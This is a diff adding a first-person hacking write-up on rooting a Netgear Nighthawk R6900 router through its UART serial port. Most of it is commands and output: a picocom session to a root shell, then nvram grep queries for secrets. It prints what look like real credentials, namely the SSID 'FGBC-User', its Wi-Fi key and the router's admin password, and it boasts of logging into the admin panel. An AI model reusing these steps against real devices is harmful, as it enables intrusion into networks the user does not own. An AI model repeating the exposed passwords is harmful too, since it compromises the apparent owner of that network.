@@ -1,0 +1,127 @@
+IOT HACKING netgear nighthawk:
+
+
+I achieved root shell via UART port with a USB TO TTY controller.
+I tested the prongs with a multi meter to find the grd, tx and rx.
+I connected the GRD and switched the RX and TX wires with the ones on my controller
+so they were crossed and plugged them into the prongs.
+
+I opened a terminal and typed:
+
+sudo picocom -b 115200 /dev/ttyUSB0
+
+this booted to a sweet r00t shell ;)
+
+# uname -a
+Linux R6900 2.6.36.4brcmarm+ #30 SMP PREEMPT Sun Dec 18 17:27:23 CST 2016 armv7l unknown
+# id
+uid=0 gid=0(root)
+
+
+this got the wifi username:
+
+nvram get wla_ssid
+FGBC-User
+# 
+
+and
+nvram show | grep -E 'wl.*_ssid'
+
+
+this got the wifi network password:
+
+# nvram show | grep -E 'wl.*_wpa2_psk|wl.*_wpa_psk|wl.*_key'
+wla_temp_key1=
+wla_temp_key2=
+wla_temp_key3=
+wla_temp_key4=
+wlg_key3_backup=
+wla_key3_2=
+wla_key3_3=
+wla_key3_4=
+wlg_key3_2=
+wl1_key=1
+wlg_temp_key1=
+wlg_temp_key2=
+wlg_key4_backup=
+wlg_temp_key3=
+wlg_temp_key4=
+wl0_key1=
+wl0_key2=
+wl0_key3=
+wl1_radius_key=
+wl0_key4=
+size: 43729 bytes (21807 left)
+wl_wpa_psk=Colone16
+wlg_key1=
+wlg_key2=
+wlg_key3=
+wla_key1_backup=
+wlg_key4=
+wla_key2_2=
+wla_key2_3=
+wla_key2_4=
+wl0_wpa_psk=Colone16
+wlg_key2_2=
+wl_key1=
+wl_key2=
+wl_key3=
+wl_key4=
+wla_key1=
+wla_key2=
+wla_key3=
+wla_key4=
+wla_key2_backup=
+wl_radius_key=
+wla_key1_2_backup=
+wla_key1_2=
+wla_key1_3=
+wl1_wpa_psk=Colone16
+wla_key1_4=
+wla_key2_2_backup=
+wlg_key1_2=
+wla_key3_2_backup=
+wla_key4_2_backup=
+wlg_key1_2_backup=
+wla_key3_backup=
+wlg_key2_2_backup=
+wlg_key1_backup=
+wlg_key3_2_backup=
+wl1_key1=
+wl1_key2=
+wl1_key3=
+wlg_key4_2_backup=
+wl1_key4=
+wl0_key=1
+wla_key4_2=
+wla_key4_3=
+wla_key4_4=
+wlg_key4_2=
+wl0_radius_key=
+wla_key4_backup=
+wl_key=1
+wlg_key2_backup=
+# 
+
+a massive win: Colone16
+
+another win: 
+# nvram show | grep -E 'http_username|http_passwd|http_username_backup|sys_passwd'
+http_username=admin
+http_passwd=Psalm119165
+size: 43729 bytes (21807 left)
+# 
+
+i connected to the wifi network it was ssid: FGBC-User
+i used the password Colone16 and it connected.
+i connect to the router config: http://192.168.1.1/
+
+it asked for username and password, i used:
+admin
+Psalm119165
+
+we are inside the admin panel. owned
+
+ch33rz, b1nv0id
+
+
